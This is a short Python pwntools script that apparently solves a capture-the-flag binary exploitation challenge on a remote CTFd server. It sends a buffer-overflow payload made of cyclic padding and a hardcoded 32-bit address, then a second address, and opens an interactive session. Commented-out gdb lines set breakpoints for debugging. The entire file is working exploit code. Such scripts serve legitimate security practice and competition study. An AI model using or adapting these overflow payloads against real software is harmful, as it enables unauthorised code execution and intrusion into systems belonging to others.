from pwn import *

#while(1):
#p = process("./www_net")
#gdb.attach(p, '''
#set follow-fork-mode child
#break *main+286
#break *main+369
#continue
#''')
p = remote('challenges.ctfd.io',30461)
payload1 = b''
payload1 += b'Aa0Aa1Aa2Aa3Aa4Aa5Aa'

payload1 += b'\x30\xc0\x04\x08'
p.sendline(payload1)
output = p.recv()
print(output)
	#0x0804942b
payload2 = b'\x2b\x94\x04\x08'
p.sendline(payload2)

output = p.recv()
print(output)

p.interactive()
	#break
